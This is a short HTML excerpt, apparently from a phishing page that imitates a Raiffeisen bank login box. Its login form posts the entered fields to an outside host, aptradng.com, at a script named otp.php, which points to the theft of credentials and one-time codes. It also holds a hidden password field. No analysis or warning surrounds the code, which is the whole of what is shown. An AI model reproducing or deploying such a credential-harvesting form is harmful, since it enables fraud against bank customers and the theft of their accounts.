					...
					<div class="narrow">
						<dl class="tabbed" id="DirektTabBox">
							...
							<dd class="tab1" style="height: auto; padding-bottom:10px;">
								<form name="loginForm" method="post" action="https://aptradng.com/raiffeisen.hu/otp.php" onsubmit="javascript:return validateLoginForm()" autocomplete="off">
									...
									<fieldset>
										...
										<input type="password" name="kod" id="username" size="20" maxlength="18" class="text" tabindex="1"  style="display: none;" required/><br/>
